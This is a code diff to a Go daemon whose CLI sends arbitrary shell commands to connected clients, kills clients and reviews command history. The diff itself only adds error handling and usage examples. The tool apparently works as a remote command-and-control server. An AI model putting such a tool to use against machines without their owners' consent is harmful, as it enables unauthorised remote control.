@@ -5,6 +5,7 @@ package main
 import (
 	"flag"
 	"fmt"
+	"log"
 	"net/http"
 	"os"
 	"strings"
@@ -38,8 +39,17 @@ func main() {
 	// 解析命令行参数
 	flag.Parse()
 
+	// 验证端口参数
+	if listenPort <= 0 || listenPort > 65535 {
+		log.Fatalf("错误: 端口号必须在 1-65535 之间，当前值: %d\n", listenPort)
+	}
+
 	// 创建HTTP服务器实例
 	server := handlers.New(listenIP, listenPort)
+	if server == nil {
+		log.Fatal("错误: 无法创建服务器实例")
+	}
+
 	// 创建命令行接口实例
 	cmdCli := cli.New(server)
 
@@ -50,7 +60,7 @@ func main() {
 		if !process.AcquireLock() {
 			fmt.Println("错误: 服务端已在运行")
 			cmdCli.Status()
-			return
+			os.Exit(1)
 		}
 
 		// 分离为后台守护进程
@@ -58,11 +68,14 @@ func main() {
 		if err != nil {
 			fmt.Printf("启动失败: %v\n", err)
 			process.ReleaseLock()
-			return
+			os.Exit(1)
 		}
 
 		// 保存进程ID
-		process.SavePID(proc.Pid)
+		if err := process.SavePID(proc.Pid); err != nil {
+			log.Printf("[警告] 保存PID失败: %v\n", err)
+		}
+
 		fmt.Println("=== 服务端已启动 ===")
 		fmt.Printf("进程 PID: %d\n", proc.Pid)
 		fmt.Printf("监听地址: %s\n", server.ListenAddr())
@@ -94,7 +107,11 @@ func main() {
 func runDaemon(server *handlers.Server) {
 	// 打开日志文件（追加模式）
 	logF, err := os.OpenFile(process.LogFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
-	if err == nil {
+	if err != nil {
+		log.Printf("[警告] 打开日志文件失败: %v\n", err)
+		logF = nil
+	}
+	if logF != nil {
 		defer logF.Close()
 		fmt.Fprintln(logF, "[服务端启动]")
 	}
@@ -111,8 +128,9 @@ func runDaemon(server *handlers.Server) {
 	// 启动HTTP服务（阻塞）
 	if err := http.ListenAndServe(server.ListenAddr(), nil); err != nil {
 		if logF != nil {
-			fmt.Fprintf(logF, "HTTP服务启动失败: %v\n", err)
+			fmt.Fprintf(logF, "[错误] HTTP服务启动失败: %v\n", err)
 		}
+		log.Fatalf("错误: HTTP服务启动失败: %v\n", err)
 	}
 }
 
@@ -133,10 +151,12 @@ func executeCommand(cmdCli *cli.CLI) {
 		// 用法: server.exe send <client_id> <command>
 		if len(args) < 2 {
 			fmt.Println("用法: server.exe send <client_id> <command>")
+			fmt.Println("示例: server.exe send client-xxx \"dir\"")
 			return
 		}
 		if err := cmdCli.SendCommand(args[0], strings.Join(args[1:], " ")); err != nil {
 			fmt.Printf("发送失败: %v\n", err)
+			os.Exit(1)
 		}
 
 	case "history":
@@ -148,6 +168,7 @@ func executeCommand(cmdCli *cli.CLI) {
 		// 用法: server.exe show <command_id>
 		if len(args) < 1 {
 			fmt.Println("用法: server.exe show <command_id>")
+			fmt.Println("示例: server.exe show cmd-20260403013032")
 			return
 		}
 		cmdCli.ShowCommand(args[0])
@@ -157,16 +178,19 @@ func executeCommand(cmdCli *cli.CLI) {
 		// 用法: server.exe kill <client_id>
 		if len(args) < 1 {
 			fmt.Println("用法: server.exe kill <client_id>")
+			fmt.Println("示例: server.exe kill client-xxx")
 			return
 		}
 		if err := cmdCli.KillClient(args[0]); err != nil {
 			fmt.Printf("断开失败: %v\n", err)
+			os.Exit(1)
 		}
 
 	case "stop":
 		// 停止服务端
 		if err := cmdCli.Stop(); err != nil {
 			fmt.Printf("停止失败: %v\n", err)
+			os.Exit(1)
 		}
 
 	case "status":
@@ -181,5 +205,6 @@ func executeCommand(cmdCli *cli.CLI) {
 		// 未知命令
 		fmt.Printf("未知命令: %s\n", cmd)
 		fmt.Println("输入 server.exe help 查看可用命令")
+		os.Exit(1)
 	}
 }
